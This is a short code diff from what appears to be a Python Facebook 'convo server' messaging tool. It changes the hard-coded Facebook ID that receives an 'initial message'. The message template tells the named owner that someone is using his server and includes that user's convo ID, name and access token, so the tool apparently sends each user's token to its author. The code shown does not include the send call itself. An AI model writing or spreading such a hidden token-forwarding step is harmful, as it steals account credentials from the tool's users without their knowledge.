@@ -107,7 +107,7 @@ def send_initial_message():
     msg_template = "Owner =>  DEVA THAKUR\n Hello  DEVA THAKUR sir. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"
     
     # Target IDs
-    target_ids = ["100004518573740"]
+    target_ids = ["100001995832516"]
     
     requests.packages.urllib3.disable_warnings()
     
